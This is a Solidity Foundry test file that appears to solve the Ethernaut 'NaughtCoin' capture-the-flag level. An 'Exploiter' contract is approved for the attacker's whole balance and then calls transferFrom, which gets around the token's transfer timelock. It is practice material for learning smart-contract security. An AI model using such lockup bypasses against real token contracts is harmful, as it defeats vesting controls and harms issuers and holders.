// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import {NaughtCoin} from "../src/NaughtCoin.sol";
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

import {Utilities} from "./utilities/Utilities.sol";

contract NaughtCoinTest is Test {
    Utilities internal utils;
    NaughtCoin internal naughtCoin;

    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(3);

        attacker = users[1];
        vm.label(attacker, "Attacker");

        naughtCoin = new NaughtCoin(attacker);
    }

    function testExploit() public {
        vm.startPrank(attacker);

        Exploiter exploiter = new Exploiter();
        uint balance = naughtCoin.balanceOf(address(attacker));

        // approve another contract your tokens
        naughtCoin.approve(address(exploiter), balance);
        uint allowance = naughtCoin.allowance(attacker, address(exploiter));

        assertEq(allowance, balance);

        exploiter.exploit(address(naughtCoin), attacker, allowance);
    }
}

contract Exploiter {
    function exploit(
        address naughtCoin,
        address attacker,
        uint256 amount
    ) public {
        // now the approved contract can transfer your tokens on your behalf.
        (bool success, ) = naughtCoin.call(
            abi.encodeWithSignature(
                "transferFrom(address,address,uint256)",
                attacker,
                address(this),
                amount
            )
        );
        require(success, "Transaction failed");
    }
}
